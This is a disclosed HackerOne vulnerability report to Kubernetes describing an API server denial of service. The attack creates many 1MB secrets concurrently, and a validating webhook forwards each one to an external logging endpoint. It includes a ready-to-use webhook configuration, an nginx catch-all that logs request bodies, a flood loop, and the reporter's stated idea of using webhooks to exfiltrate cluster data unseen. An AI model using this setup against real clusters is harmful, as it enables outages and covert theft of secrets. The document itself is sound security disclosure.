# API Server DoS (crash?) if many large resources (~1MB each) are concurrently/repeatedly sent to an external Validating WebHook endpoint

## Report Details
- **Report ID**: 1096907
- **URL**: https://hackerone.com/reports/1096907
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-06T01:03:06.792Z
- **Disclosed**: 2021-04-01T18:28:28.705Z

## Reporter
- **Username**: bradgeesaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
I was trying to explore a way to stealthily send lots of data outside a private GKE cluster by way of misusing the Validating Webhook mechanism.  The idea would be that a cluster-admin could install a webhook and then initiate resources (like a secret or configmap) that contains the data to exfil in "chunks" and then throw them all at the API server and get the control plane to send the data out, 1MB at a time, to the desired malicious webhook endpoint that would always respond "yes" but log those chunks.  It would bypass DNS logs, VPC flow logs, and firewall logs.  However, as I started sending these 1MB secrets, I found that the API server would just go away...so, here I am with a potential accidental crash/DoS that I'm pretty confident is legit.  The cleaned up description is:

Sending large resources (~1MB) from a varying number of clients (5 to 100) to an API server configured with an external to the cluster Validating Webhook in a "loop" eventually appears to exhaust some resource level on the API server and cause it to no longer be available.  After it recovers, it appears to be possible to retrigger the failure condition by repeating the attack.

## Kubernetes Version:
Tested against a single zone GKE cluster:

```
{
  "major": "1",
  "minor": "17+",
  "gitVersion": "v1.17.14-gke.1600",
  "gitCommit": "7c407f5cc8632f9af5a2657f220963aa7f1c46e7",
  "gitTreeState": "clean",
  "buildDate": "2020-12-07T09:22:27Z",
  "goVersion": "go1.13.15b4",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```

## Component Version:
Tested against GKE:

```
{
  "major": "1",
  "minor": "17+",
  "gitVersion": "v1.17.14-gke.1600",
  "gitCommit": "7c407f5cc8632f9af5a2657f220963aa7f1c46e7",
  "gitTreeState": "clean",
  "buildDate": "2020-12-07T09:22:27Z",
  "goVersion": "go1.13.15b4",
  "compiler": "gc",
  "platform": "linux/amd64"
}
```
## Steps To Reproduce:
This _may_ be GKE specific, but something tells me it's not.

  1. Create a private GKE cluster (not sure if private is required for this, actually)

```
gcloud beta container --project "gkek8s-178117" clusters create "sieve-clone-1" --zone "us-central1-c" --no-enable-basic-auth --cluster-version "1.17.14-gke.1600" --release-channel "regular" --machine-type "e2-medium" --image-type "COS_CONTAINERD" --disk-type "pd-standard" --disk-size "60" --metadata disable-legacy-endpoints=true --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --max-pods-per-node "64" --preemptible --num-nodes "1" --no-enable-stackdriver-kubernetes --enable-private-nodes --enable-private-endpoint --enable-ip-alias --network "projects/gkek8s-178117/global/networks/external" --subnetwork "projects/gkek8s-178117/regions/us-central1/subnetworks/external" --default-max-pods-per-node "64" --enable-network-policy --enable-master-authorized-networks --addons HorizontalPodAutoscaling,NodeLocalDNS --enable-autoupgrade --enable-autorepair --max-surge-upgrade 1 --max-unavailable-upgrade 0 --workload-pool "gkek8s-178117.svc.id.goog" --enable-shielded-nodes --security-group "gke-security-groups@lonimbus.com"
```

  1. Create a TLS endpoint to "catch" the webhooks on a dedicated VM on a public IP with a valid TLS cert and listening on 443.  Here's my nginx.conf for my host named `https://docker.lonimbus.com` that always blindly allows the resource:

   ```
log_format addHeaderlog escape=json '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent" "$http_x_forwarded_for" "$request_body" "$http_Authorization" "$http_x_duid" "$http_x_ver" "$upstream_http_x_rqid"';

server {
        access_log /var/log/nginx/access.log addHeaderlog;
        client_body_in_single_buffer on;
        client_max_body_size 5M;
        client_body_buffer_size 16k;

        listen 80;
        listen 443 ssl;

        ssl_certificate /etc/ssl/certs/docker.lonimbus.com.crt;
        ssl_certificate_key /etc/ssl/private/docker.lonimbus.com.key;
        ssl_protocols TLSv1.2;
        ssl_prefer_server_ciphers on;
        #ssl_dhparam /etc/nginx/dhparam.pem;
        ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384;
        ssl_ecdh_curve secp384r1; # Requires nginx >= 1.1.0
        ssl_session_timeout  10m;
        ssl_session_cache shared:SSL:10m;
        ssl_session_tickets off; # Requires nginx >= 1.5.9
        ssl_stapling on; # Requires nginx >= 1.3.7
        ssl_stapling_verify on; # Requires nginx => 1.3.7
        resolver 8.8.8.8 8.8.4.4 valid=300s;
        resolver_timeout 5s;
        add_header X-Frame-Options DENY;
        add_header X-Content-Type-Options nosniff;
        add_header X-XSS-Protection "1; mode=block";

        server_name docker.lonimbus.com;

        root /var/www/html;
        index index.html;

        location / {
          return 200 'ok';
        }
        location /validator {
          proxy_pass http://127.0.0.1/ok;
        }
        location /ok {
          types {}
          default_type application/json;
          return 200 '{"response": {"allowed": true, "status": {"message": "permission granted"}}}';
        }
}
  ```
  1. Install a validating webhook configuration that sends resources off to that url.  I chose "create secrets".  Note that I have failurePolicy: ignore and timeoutSeconds: 1 to "fail open" if the destination isn't there (in theory).

```
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: validator
webhooks:
  - name: docker.lonimbus.com
    failurePolicy: Ignore
    timeoutSeconds: 1
    admissionReviewVersions: ["v1", "v1beta1"]
    sideEffects: None
    clientConfig:
      caBundle: LS0tLS1CRUdJTiBDRVJU...snip...0tLQo=
      url: https://docker.lonimbus.com/validator
    rules:
      - operations: ["CREATE","UPDATE"]
        apiGroups: ["*"]
        apiVersions: ["*"]
        resources: ["secrets"]

```

  1. Create a 1MB file of gibberish text.  I used a lorem ipsum generator:

```
$ ls -alh
-rw-r--r--   1 bg  staff   990K Feb  5 15:18 lorem-1MB
-rw-r--r--   1 bg  staff   2.1K Feb  5 15:28 nginx.conf
-rw-r--r--   1 bg  staff   8.6K Feb  5 15:04 validator.yaml

$ head lorem-1MB 
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec elementum dolor nunc, facilisis viverra erat pellentesque non. Nulla lacinia ipsum nibh, at auctor lectus efficitur a. Aenean nisi turpis, placerat nec auctor ac, aliquet a augue. Ut ullamcorper, dolor at mattis lobortis, elit est blandit tortor, in posuere arcu nunc vitae sem. Quisque nibh ex, mattis ac euismod ac, pellentesque id lectus. Proin sollicitudin enim a rutrum pulvinar. Sed nibh justo, vehicula eu metus non, ultrices condimentum eros.
```

  1. By way of a bastion GCE VM in that same VPC as the GKE private cluster, run N number of concurrent "create 1MB secret" calls:

```
 # terminal 1
for i in $(seq 1 100); do k create secret generic test-b$i --from-file=lorem-1MB & done
```

  1. Wait a few minutes letting these go on until they start getting errors at the same time (see `2_4_clients_all_failing_at_the_same_time.jpg`).  Stop the loops, and confirm the API server isn't responding with a curl to the `/version` endpoint hanging.  Then, refer to the audit logs to see the errors and eventually the repair operation.  A few minutes later, the API server should return to healthy, ready for another round. 

## Supporting Material/References:

  * 1_4_clients_early_on.jpg - Tailing nginx access logs on docker.lonimbus.com in the back/lower left.  In front, four separate terminals, each creating a secret over and over again.  (The test harness was improved after these screencaps were taken to run N concurrently.)
  * 2_4_clients_all_failing_at_the_same_time.jpg - Same 4 clients getting the same error at the same time indicating the API server wasn't available a few minutes into the looping process.  A curl to the API server for the `/version` would also hang at this point.
  * 3_audit_logs_showing_internal_server_error.png - A few mins after, the GCP audit logs would also reflect the internal server error.
  * 4_audit_logs_showing_repair_cluster_operation.png - GKE Operations logs showing the service initiating repair operations
  * 5_GCP_UI_showing_repair_of_cluster.png - GKE Cluster object in dashboard showing it's under repair.
  * K8s_VWK_DoS-trimmed.mov - the last artifact I recorded showing how I exacerbated the repair and could no longer curl for the /version and showing the operational log showing it needing repair.

## Impact

An authenticated user or service account with permissions to create/patch/delete a resource gated by a ValidatingWebhookConfiguration could potentially trigger a DoS of the API server.  In my testing, it appears that the control plane instance "crashes" and the health checking mechanisms in GKE watching the control plane instances kick in and "repair" the control plane.  Based on the delay, it would appear that it's reprovisioning the control plane GCE VM.

## Attachments
- 2_4_clients_all_failing_at_the_same_time.jpg
- 1_4_clients_early_on.jpg
- 3_audit_logs_showing_internal_server_error.png
- 4_audit_logs_showing_repair_cluster_operation.png
- 5_GCP_UI_showing_repair_of_cluster.png
- K8s_VWK_DoS-trimmed.mov
